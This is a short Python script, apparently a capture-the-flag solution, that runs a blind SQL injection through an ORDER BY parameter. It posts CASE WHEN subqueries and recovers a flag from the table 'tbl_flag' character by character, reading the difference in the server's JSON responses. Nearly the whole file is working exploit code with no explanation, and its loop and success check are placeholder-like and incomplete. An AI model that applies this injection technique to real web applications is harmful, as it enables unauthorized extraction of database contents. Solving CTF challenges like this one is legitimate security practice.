"""
We use this peace of code if we want to inject when we have access to ordering
"""

import requests
import string

leaked_data = list("CHTB{")

printable = '_' + string.ascii_lowercase + string.ascii_uppercase + '}'

url = 'https://someurl.com/'
table_name = 'tbl_flag'

while True:
    for char in printable:
        position = len(leaked_data) + 1

        r = requests.post(
            url,
            data={
                'order': f"(CASE WHEN (SELECT SUBSTR(flag, {position}, 1) FROM {table_name}) = '{char}' "
                         f"THEN count ELSE id END) DESC"
            },
        )

        j = r.json()
        if j[0] == 'something':
            leaked_data.append(char)
            break
        print(f"trying {''.join(leaked_data) + char}")
